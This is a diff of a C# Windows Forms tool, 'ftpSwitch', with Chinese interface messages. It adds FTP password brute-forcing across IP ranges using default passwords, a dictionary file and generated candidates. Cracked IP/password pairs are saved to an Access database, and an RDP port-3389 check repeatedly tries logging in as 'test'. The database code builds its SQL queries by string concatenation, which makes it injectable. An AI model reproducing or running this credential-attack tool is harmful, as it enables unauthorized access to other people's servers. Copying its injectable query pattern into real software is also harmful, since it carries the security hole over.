@@ -11,7 +11,7 @@ using System.Text.RegularExpressions;
 using System.Net.Sockets;
 using System.Threading;
 using System.Data.OleDb;
-
+using System.IO;
 
 
 namespace ftpSwitch
@@ -21,9 +21,19 @@ namespace ftpSwitch
         string ftpServerIP;
         string ftpObjIp;
         string[] ftpPassword = { "", "asd123", "111", "1", "aaa", "123456", " " };
+        static Dictionary<char, int> pswDic = new Dictionary<char, int>{
+            { '0', 0 }, {'1',1 }, {'2',2 }, {'3',3 }, {'4',4},{'5', 5 }, {'6',6 }, {'7',7 },{'8', 8 },{'9', 9 },{'a', 10 }, {'b',11 }, {'c',12 }
+        };
+        static Dictionary<int, char> strPswDic = new Dictionary<int, char>{
+            { 0, '0' }, {1,'1' }, {2,'2' }, {3,'3' }, {4,'4'},{5, '5' }, {6,'6' }, {7,'7' },{8, '8' },{9, '9' },{10, 'a' }, {11,'b' }, {12,'c' }
+        };
         string FS;
         bool trystate = true;
         bool is_con = true;
+        public List<string[]> InfoList = new List<string[]>();
+        bool is_success = false;
+        List<string> PswList;
+        public delegate List<string> MethodCaller(string path);
 
 
         public Form1()
@@ -33,14 +43,17 @@ namespace ftpSwitch
 
         private void Form1_Load(object sender, EventArgs e)
         {
-
+            MethodCaller mc = new MethodCaller(Read);
+            IAsyncResult result = mc.BeginInvoke(@"C:\Users\lflx1\source\repos\ftpSwitch\dbs\psw.txt", null, null);
+            PswList = mc.EndInvoke(result);
+            ShowMsg("密码字典读取完成,最终行为：" + makePsw(PswList[PswList.Count - 1]));
         }
 
         private void textBox1_TextChanged(object sender, EventArgs e)
         {
             if (textBox1.Text.Contains("IP"))
             {
-                textBox1.Text="";
+                textBox1.Text = "";
             }
         }
 
@@ -54,57 +67,130 @@ namespace ftpSwitch
             Control.CheckForIllegalCrossThreadCalls = false;
             ftpServerIP = textBox1.Text;
             ftpObjIp = textBox2.Text;
+            is_success = false;
             bool EF = true;
             if (ValidateIPAddress(ftpServerIP) && ValidateIPAddress(ftpObjIp))
             {
                 int check = 0;
                 long che = 0;
                 int checkObj = 0;
+                bool isBySql = false;
                 string sta = boom(ftpServerIP.Split('.'));
-                
+
                 string obj = boom(ftpObjIp.Split('.'));
 
                 //string sta = ftpServerIP.Replace(".", "");
                 //string obj = ftpObjIp.Replace(".", "");
+
                 check = int.Parse(sta.Substring(sta.Length - 3, 3));
                 checkObj = int.Parse(obj.Substring(obj.Length - 3, 3));
                 che = System.Math.Abs(long.Parse(sta) - long.Parse(obj));
-                if (che >= 255)
-                {
-                    MessageBox.Show("这都跨网段了，目标小一点吧");
-                    return;
-                }
                 string ip = ftpServerIP;
-                while (System.Math.Abs(check - checkObj) >= 0 && EF)
+                int max = int.Parse(textBox3.Text);
+                if (Dictionary.Checked)
                 {
-                  
-                    ShowMsg("尝试匿名登陆");
-                    if(is_con)
-                        FtpBySocket(ip, "", "");
-                    if (!trystate)
+                    if (string.Equals(ValidateIPAddress(ftpServerIP), ValidateIPAddress(ftpObjIp)))
                     {
-                        if (is_con)
+                        int listCount = PswList.Count;
+                        int maxcount = 1;
+                        foreach (string s in PswList)
                         {
-                            foreach (string psw in ftpPassword)
-                            {
-                                FtpBySocket(ip, "test", psw);
-                                if (trystate) break;
-                                if (!is_con) break;
-                            }
+                            FtpBySocket(ip, "test", s);
+                            if (is_success) break;
+                            if (maxcount >max-1) break;
+                            maxcount++;
                         }
-                    }
-                    che--;
-                    if (string.Equals(ip, ftpObjIp))
-                    {
-                        EF = false;
+                        string psw = makePsw(PswList[PswList.Count - 1]);
+                        while (!is_success && max-listCount > 0)
+                        {
+                            FtpBySocket(ip, "test", psw);
+                            psw = makePsw(psw);
+                            Write(psw);
+                            max--;
+
+                        }
+
+                        if (is_success)
+                        {
+                            string[] submit = { "test", psw };
+                            InfoList.Add(submit);
+                        }
+
                     }
                     else
                     {
-                        ip = strsub(ip);
-                        is_con = true;
+                        MessageBox.Show("暴力破解就对单一目标吧");
                     }
                 }
+                else
+                {
+
+                    if (che >= 255)
+                    {
+                        MessageBox.Show("这都跨网段了，目标小一点吧");
+                        return;
+                    }
+                    while (System.Math.Abs(check - checkObj) >= 0 && EF)
+                    {
+                        string[] iplist = { ip, "" };
+                        ShowMsg(SelectPassword(ip));
+                        string que = SelectPassword(ip);
+                        if (que != "")
+                        {
+                            FtpBySocket(ip, "test", que);
+                            isBySql = true;
+                        }
+                        if (!is_success)
+                        {
+                            ShowMsg("尝试匿名登陆");
+                            if (is_con)
+                            {
+                                FtpBySocket(ip, "", "");
+                                if (is_success && !isBySql)
+                                {
+                                    InfoList.Add(iplist);
+                                    is_success = false;
+                                }
+                            }
+                            if (!trystate)
+                            {
+                                if (is_con)
+                                {
+                                    foreach (string psw in ftpPassword)
+                                    {
+
+                                        FtpBySocket(ip, "test", psw);
+                                        iplist[1] = psw;
+                                        if (is_success)
+                                        {
+                                            InfoList.Add(iplist);
+                                            is_success = false;
+                                        }
+                                        if (trystate) break;
+                                        if (!is_con) break;
+                                    }
+                                }
+                            }
+                        }
+                        che--;
+                        if (string.Equals(ip, ftpObjIp))
+                        {
+                            EF = false;
+                        }
+                        else
+                        {
+                            ip = strsub(ip);
+                            is_con = true;
+                        }
+                    }
+                }
+                if (InfoList != null && InfoList.Count > 0)
+                {
+                    Insert(InfoList);
+                }
+
             }
+
             else
             {
                 MessageBox.Show("IP输入格式不对哟，看看是不是输错了");
@@ -175,7 +261,7 @@ namespace ftpSwitch
 
         }
 
-       
+
 
         private void label2_Click_2(object sender, EventArgs e)
         {
@@ -221,7 +307,7 @@ namespace ftpSwitch
         Socket socket;
         public int FtpBySocket(string Ip, string User, string Password, string Port = "21")
         {
-            
+
             try
             {
                 socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -243,7 +329,7 @@ namespace ftpSwitch
                 ShowMsg("\r\n 连接发生错误 --> " + ex.Message);
             }
 
-            
+
             return 0;
         }
 
@@ -253,8 +339,8 @@ namespace ftpSwitch
         }
         void Received()
         {
-            
-            
+
+
             byte[] buffer = new byte[1024 * 1024 * 3];
             //实际接收到的有效字节数
             int len = socket.Receive(buffer);
@@ -272,6 +358,10 @@ namespace ftpSwitch
             {
                 trystate = true;
             }
+            if (str.Contains("230"))
+            {
+                is_success = true;
+            }
 
 
         }
@@ -282,18 +372,66 @@ namespace ftpSwitch
         }
 
 
-        private static string connStr = @"Provider = Microsoft.Ace.OLEDB.12.0;Data Source = C:\Users\lflx1\source\repos\ftpSwitch\dbs\ftpfinder.mdb";
-        void DB()
+        private static string conStr = @"Provider=microsoft.ace.oledb.12.0;Data Source=C:\Users\lflx1\source\repos\ftpSwitch\dbs\ftpfinder.mdb";
+
+        private OleDbConnection DB()
         {
             try
             {
-                OleDbConnection oleDb = new OleDbConnection(connStr);
-                MessageBox.Show(oleDb.DataSource);
-            }
-            catch
-            {
+                OleDbConnection dbconn = new OleDbConnection(conStr);
 
+                return dbconn;
             }
+            catch (Exception ex)
+            {
+                ShowMsg("\r\n 数据库连接发生错误 --> " + ex.Message);
+                return null;
+            }
+
+        }
+
+        void Insert(List<string[]> list)
+        {
+
+            OleDbConnection db = DB();
+            string sql = "";
+            foreach (string[] l in list)
+            {
+                sql = "INSERT INTO finder VALUES ( '" + l[0] + "','" + l[1] + "'  ) ";
+                ShowMsg(sql);
+                ShowMsg("记录连接->IP:" + l[0] + "密码：" + l[1]);
+            }
+
+            db.Open();
+
+            OleDbCommand cmd = new OleDbCommand(sql, db);
+            int a = cmd.ExecuteNonQuery();
+            db.Close();
+            if (a > 0)
+            {
+                ShowMsg("记录成功");
+            }
+
+        }
+        string SelectPassword(string ip)
+        {
+            OleDbConnection db = DB();
+            db.Open();
+            string rec = "";
+            string sql = "SELECT PASSWORD FROM finder WHERE IP ='" + ip + "'";
+            OleDbCommand cmd = new OleDbCommand(sql, db);
+            if (cmd.ExecuteScalar() != null)
+                rec = cmd.ExecuteScalar().ToString();
+            db.Close();
+
+            return rec;
+        }
+
+
+
+        void FileRite()
+        {
+
         }
 
         private void StateShow_TextChanged(object sender, EventArgs e)
@@ -308,7 +446,7 @@ namespace ftpSwitch
 
         public string boom(string[] strings)
         {
-            string str="";
+            string str = "";
             foreach (string s in strings)
             {
                 switch (s.Length)
@@ -329,9 +467,9 @@ namespace ftpSwitch
         public string strsub(string str)
         {
             string st = "";
-            string[] s= str.Split('.');
+            string[] s = str.Split('.');
 
-            for(int i = 0; i < 4; i++)
+            for (int i = 0; i < 4; i++)
             {
                 if (i == 3)
                 {
@@ -339,7 +477,7 @@ namespace ftpSwitch
                 }
                 else
                 {
-                    st += s[i]+".";
+                    st += s[i] + ".";
                 }
             }
             return st;
@@ -351,6 +489,146 @@ namespace ftpSwitch
             {
                 textBox2.Text = "";
             }
+        }
+
+        public List<string> Read(string path)
+        {
+            StreamReader sr = new StreamReader(path, Encoding.Default);
+            string line;
+            List<string> list = new List<string>();
+            while ((line = sr.ReadLine()) != null)
+            {
+                list.Add(line.ToString());
+            }
+            sr.Close();
+            return list;
+        }
+        public void Write(string path)
+        {
+            string loc = @"C:\Users\lflx1\source\repos\ftpSwitch\dbs\psw.txt";
+            StreamWriter sw = new StreamWriter(loc, true);
+            sw.WriteLine(path);
+            sw.Close();
+        }
+
+        public string makePsw(string last)
+        {
+            string rec = "";
+            int[] flag = { -1, -1, -1, -1 };
+            int j = 0;
+            for (int m = 4 - (last.Length); m < 4; m++)
+            {
+
+                flag[m] = pswDic[last[j]];
+                j++;
+            }
+
+            for (int i = 3; i >= 0; i--)
+            {
+                if (i == 3)
+                    flag[i]++;
+
+                if (flag[i] >= 13)
+                {
+                    flag[i] = 0;
+                    flag[i - 1]++;
+                }
+            }
+
+            foreach (int k in flag)
+            {
+                if (k >= 0)
+                {
+                    rec += strPswDic[k];
+                }
+            }
+            return rec;
+        }
+
+        private void textBox3_TextChanged(object sender, EventArgs e)
+        {
+                textBox2.Text = "";
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+
+        }
+        bool is_rdp_success = false;
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            is_rdp_success = false;
+            string ip = textBox4.Text;
+            try
+            {
+                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                IPAddress socketIp = IPAddress.Parse(ip);
+                IPEndPoint point = new IPEndPoint(socketIp, Convert.ToInt32(3389));
+                socket.Connect(point);
+                ShowMsg("端口开启");
+                socket.Close();
+                if (radioButton1.Checked)
+                {
+                    ConMstsc(ip, "3389", "test", "1", false);
+                }
+                while (!is_rdp_success)
+                {
+                    ConMstsc(ip, "3389", "test", "1",true);
+                    DateTime dt1 = DateTime.Now;
+                    while ((DateTime.Now - dt1).TotalMilliseconds < 3000) Application.DoEvents();
+                    if (!is_rdp_success)
+                    {
+                        rdp.Disconnect();
+                        while ((DateTime.Now - dt1).TotalMilliseconds < 4000) Application.DoEvents();
+                        MstscShow("系统正被占用或登陆时用户名密码错误或超时");
+                        
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MstscShow("发生错误->" + ex.Message);
+            }
+        }
+
+        void MstscShow(string str)
+        {
+            MstscState.Items.Add(str);
+            MstscState.TopIndex = MstscState.Items.Count - 1;
+        }
+        void ConMstsc(string ip, string port, string user, string password, bool model)
+        {
+            
+            try
+            {
+                
+                rdp.Server = ip;
+                rdp.AdvancedSettings2.RDPPort = int.Parse(port);
+                rdp.UserName = user;
+                rdp.AdvancedSettings2.ClearTextPassword = password;
+                if (model)
+                    rdp.OnLoginComplete += Rdp_OnLoginComplete;
+                rdp.Connect();
+            }
+            catch (Exception ex)
+            {
+                MstscShow("发生错误->" + ex.Message);
+            }
+        }
+
+        private void Rdp_OnLoginComplete(object sender, EventArgs e)
+        {
+            is_rdp_success = true;
+            MstscShow("连接成功,请根据桌面提示进行操作");
+        }
+
+        private void rdp_OnConnecting(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Maximized;
+        }
+        private bool  socketFinder()
+        {
+            return true;
         }
     }
 
